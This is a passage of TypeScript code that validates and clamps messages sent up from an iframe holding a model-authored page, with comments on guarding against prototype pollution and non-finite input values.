      return { t: 'ready', protocol: finiteNumber(m.protocol) ? m.protocol : 0 };

    case 'size':
      if (!finiteNumber(m.w) || !finiteNumber(m.h)) { return null; }
      // Negative or absurd geometry is a bug or an attack; clamp, don't trust.
      return { t: 'size', w: Math.max(0, Math.round(m.w)), h: Math.max(0, Math.round(m.h)) };

    case 'rects': {
      if (!m.rects || typeof m.rects !== 'object' || Array.isArray(m.rects)) { return null; }
      const out: Record<Mid, FrameRect> = {};
      let n = 0;
      for (const [mid, value] of Object.entries(m.rects as Record<string, unknown>)) {
        if (n >= FRAME_MAX_RECTS) { break; }
        if (!FRAME_MID_RE.test(mid)) { continue; }
        const rect = parseRect(value);
        if (!rect) { continue; }
        // A mid is a model-influenced string: `out['__proto__'] = rect` would
        // hit the prototype setter and drop the entry from `Object.entries`,
        // so the element would silently become unselectable.
        putOwn(out, mid, rect);
        n++;
      }
      return { t: 'rects', rects: out };
    }

    case 'wheel': {
      // Every field is attacker-influenceable: a model-authored page owns this
      // frame. Clamp rather than trust — a non-finite delta would poison the
      // board transform, and an absurd one would teleport the view.
      if (!finiteNumber(m.deltaX) || !finiteNumber(m.deltaY)) { return null; }
      const clamp = (v: number) => Math.max(-FRAME_MAX_WHEEL_DELTA, Math.min(FRAME_MAX_WHEEL_DELTA, v));
      const mode = finiteNumber(m.deltaMode) ? Math.max(0, Math.min(2, Math.round(m.deltaMode))) : 0;
      return {
        t: 'wheel',
        deltaX: clamp(m.deltaX), deltaY: clamp(m.deltaY), deltaMode: mode,
        ctrlKey: m.ctrlKey === true, metaKey: m.metaKey === true,
        x: finiteNumber(m.x) ? m.x : 0, y: finiteNumber(m.y) ? m.y : 0,
      };
    }

    case 'hit': {
      if (typeof m.mid !== 'string' || !FRAME_MID_RE.test(m.mid)) { return null; }
      const rect = parseRect(m.rect);
      if (!rect) { return null; }
      return { t: 'hit', mid: m.mid, rect, modifiers: parseModifiers(m.modifiers), double: m.double === true };
    }

    case 'textCommit':
      if (typeof m.mid !== 'string' || !FRAME_MID_RE.test(m.mid)) { return null; }
      if (typeof m.text !== 'string') { return null; }
      return { t: 'textCommit', mid: m.mid, text: clampStr(m.text, FRAME_MAX_TEXT) };

    case 'error': {
      const msg: FrameUpMessage = { t: 'error', message: clampStr(m.message, FRAME_MAX_MESSAGE) };
      if (typeof m.stack === 'string') { msg.stack = clampStr(m.stack, FRAME_MAX_MESSAGE * 2); }
      if (typeof m.mid === 'string' && FRAME_MID_RE.test(m.mid)) { msg.mid = m.mid; }
      return msg;
    }

    default:
      return null;
  }
}
